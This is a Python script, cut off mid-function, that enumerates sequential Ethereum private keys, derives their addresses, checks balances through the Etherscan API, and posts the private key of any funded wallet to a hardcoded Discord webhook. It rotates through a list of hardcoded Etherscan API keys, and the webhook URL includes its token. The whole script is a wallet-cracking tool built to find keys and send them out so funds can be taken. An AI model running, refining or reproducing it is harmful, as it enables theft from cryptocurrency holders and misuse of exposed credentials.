import asyncio
import httpx
import logging
from Crypto.Hash import keccak
import ecdsa
import binascii
from discordwebhook import Discord
import itertools

logging.basicConfig(level=logging.INFO)

# Constants for batch notifications
BATCH_SIZE = 10
BATCH_INTERVAL = 5  # in seconds

# List to accumulate notification messages
notification_buffer = []

# Function to send batch notifications
async def send_batch_notifications():
    global notification_buffer
    if notification_buffer:
        batch_message = "\n".join(notification_buffer)
        discord_notification(batch_message)
        notification_buffer = []

# Function to enqueue notification messages
def enqueue_notification(message):
    global notification_buffer
    notification_buffer.append(message)
    if len(notification_buffer) >= BATCH_SIZE:
        asyncio.create_task(send_batch_notifications())

# Function to send individual notifications with throttling
async def send_notification(message):
    enqueue_notification(message)
    await asyncio.sleep(BATCH_INTERVAL)

# Function to distribute API keys evenly across threads
def distribute_api_keys(keys, num_threads):
    key_iterator = itertools.cycle(keys)
    return [next(key_iterator) for _ in range(num_threads)]

# Function to determine optimal batch size
def get_optimal_batch_size():
    # Set an initial conservative value
    optimal_batch_size = 10
    # Adjust batch size based on factors such as API rate limits, network latency, and server load
    # This is a placeholder, actual adjustments should be based on performance measurements
    # For simplicity, we'll keep it fixed for now
    return optimal_batch_size

# Function to get user input with validation
def get_user_input(prompt, condition):
    while True:
        try:
            value = int(input(prompt))
            if not condition(value):
                print(f"Invalid input: {prompt}")
                continue
            return value
        except ValueError:
            print("Error: value should be in integer format")

# Collecting user inputs
start_value = get_user_input("Start value: ", lambda x: x > 0)
number_of_threads = get_user_input("Number of threads: ", lambda x: x > 0)
no_of_accounts = get_user_input("Number of accounts per batch: ", lambda x: x > 0)
check_in_thread = 10000  # Default value, will be adjusted based on the input range

# Discord notification function
def discord_notification(msg):
    try:
        webhook_url = "https://discord.com/api/webhooks/1237273754414092328/TKG1nt0b7VCWspq-oFpModKHWLcsQB-aAaNBLHxYDSJXDIa-c9OF0J6WH2n9L-UjwPPh"
        discord = Discord(url=webhook_url)
        discord.post(content=msg)
    except Exception as e:
        logging.error(f"Failed to send Discord notification: {e}")

# List of API keys
api_keys = [
    'F92Z14GE2DTF6PBBYY1YPHPJ438PT3P2VI',
    '4Q5U7HNF4CGTVTGEMGRV5ZU9WYNJ6N7YA5',
    'EX8K12JY7BCVG8RAUU8X2Z6QT2GCF5EYB4',
    'DZHWCIEA2WW86CZEC88IGWG1JFB6JN3VHS',
    'YIDAXPUWHJB21RJVMS1JMXHABMEF67RQWG',
    '12RU83G1ATVA9V4EMM3U45X8BG4RG9PM6T',
    'PYM9U2QD949KZZX23QJ4YZRX3KC3PHAI88',
    'SH884AZJMKIFDMAPSMHTHJUQ3QIRPH827I',
    'PYM9U2QD949KZZX23QJ4YZRX3KC3PHAI88',
    'TDMPDZU8RD4V9FVB66P5S47QETEJ6R61UY'
]

# Function to generate Ethereum address from private key
async def generate_address(private_key, num):
    addresses = []
    for i in range(num):
        private_key_hex = hex(private_key + i)[2:].zfill(64)
        sk = ecdsa.SigningKey.from_string(binascii.unhexlify(private_key_hex), curve=ecdsa.SECP256k1)
        vk = sk.get_verifying_key()
        public_key = vk.to_string()
        keccak_hash = keccak.new(digest_bits=256)
        keccak_hash.update(public_key)
        public_key_hash = keccak_hash.digest()
        ethereum_address = "0x" + public_key_hash.hex()[-40:]
        addresses.append(ethereum_address)
    return addresses

# Function to get balance of Ethereum addresses with retries and exponential backoff
async def get_balance(addresses, api_key, client):
    address_str = ','.join(addresses)
    url = f'https://api.etherscan.io/api?module=account&action=balancemulti&address={address_str}&tag=latest&apikey={api_key}'
    retry_attempts = 3
    retry_delay = 1
    for attempt in range(retry_attempts):
        try:
            response = await client.get(url)
            response.raise_for_status()
            return response.json()
        except httpx.HTTPStatusError as e:
            logging.error(f"HTTP error: {e}")
        except httpx.RequestError as e:
            logging.error(f"Request error: {e}")
        logging.info(f"Retrying in {retry_delay} seconds...")
        await asyncio.sleep(retry_delay)
        retry_delay *= 2  # Exponential backoff
    logging.error(f"Failed to fetch balance for addresses: {addresses}")
    return None

# Function to run the balance check process for a batch
async def run_batch(batch_index, start, no_of_accounts, api_key, client):
    addresses = await generate_address(start, no_of_accounts)
    response = await get_balance(addresses, api_key, client)
    return await process_balance_response(response, start, no_of_accounts)

# Function to process the balance response
async def process_balance_response(response, start, no_of_accounts):
    if response is None:
        return False
    if 'status' in response and response['status'] == '1':
        for index, rec in enumerate(response['result']):
            hex_id = start + index
            balance_wei = int(rec['balance'])
            if balance_wei > 3000000000000000:
                discord_notification(f"Found good balance, private-key {hex(hex_id)[2:].zfill(64)}")
            elif balance_wei > 0:
                logging.info(f"{hex_id} {rec['account']} {balance_wei / 1e18}")
        return True
    else
